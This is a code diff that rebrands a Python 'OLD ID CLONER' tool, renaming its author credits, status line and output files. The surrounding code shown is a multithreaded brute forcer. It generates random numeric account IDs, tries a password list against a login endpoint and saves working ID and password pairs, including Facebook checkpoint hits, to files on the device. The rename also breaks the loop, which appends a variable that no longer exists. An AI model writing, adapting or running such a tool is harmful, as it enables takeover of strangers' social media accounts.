@@ -10,7 +10,7 @@ class OLD_CLONER:
     
     def banner(self):
         os.system("clear")
-        print("DEVELOPER  : HADI ANHAF AIMAN")
+        print("DEVELOPER  : BHAT WASU")
         print("GITHUB     : MR-CODE-143")
         print("FEATURE    : OLD ID CLONER")
         print("VERSION    : 1.6 FREEEEE")
@@ -40,7 +40,7 @@ class OLD_CLONER:
         print("EXAMPLE  - 5000,10000")
         limit = int(input("SELECT   - "))
         for a in range(limit):
-            aiman = "".join(random.choice(string.digits) for _ in range(self.uG))
+            WASU= "".join(random.choice(string.digits) for _ in range(self.uG))
             self.gen.append(aiman)
         with ThreadPoolExecutor(max_workers=50) as Mr_Code:
             self.banner()
@@ -78,7 +78,7 @@ class OLD_CLONER:
     
     def CloneOld(self,ids,passlist):
         global loop,oks,cps
-        sys.stdout.write(f"\r\r\x1b[mAIMAN-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
+        sys.stdout.write(f"\r\r\x1b[mWASU-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
         sys.stdout.flush()
         try:
             for pas in passlist:
@@ -125,12 +125,12 @@ class OLD_CLONER:
                 response = requests.post(url,data=data,headers=head,verify=True).json()
                 if "access_token" in response:
                     print(f"\r\r\x1b[38;5;46mOLD-OK • {ids} • {pas}")
-                    open("/sdcard/AIMAN-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
+                    open("/sdcard/WASU-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                     self.oks.append(ids)
                     break
                 elif "www.facebook.com" in response["error"]["message"]:
                     print(f"\r\r\x1b[38;5;196mOLD-CP • {ids} • {pas}")
-                    open("/sdcard/AIMAN-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
+                    open("/sdcard/WASU-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                     self.cps.append(ids)
                     break
                 else:continue
